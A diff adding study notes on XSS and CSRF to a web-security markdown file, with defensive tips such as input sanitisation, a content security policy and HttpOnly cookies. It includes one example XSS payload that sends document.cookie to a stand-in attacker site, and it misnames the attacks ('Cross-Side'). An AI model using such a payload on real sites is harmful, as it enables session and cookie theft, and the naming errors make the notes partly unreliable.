@@ -50,3 +50,23 @@
 
 - SSL / TLS certificates
 - https://letsencrypt.org/
+
+## XSS & CSRF
+
+### XSS - Cross-Side-Scripting
+
+- allows attacker to execute script in client's server
+- `window.location = 'new_bad_website?cookie='+ document.cookie`
+- prevent through input sanitisation
+
+### Cross Side Request Forgery
+
+- create bad URL that has malicious code in it
+
+### How to prevent
+
+- sanitise inputs
+- no `eval()`
+- no `document.write()`
+- content security policy
+- secure + HTTPOnly cookies
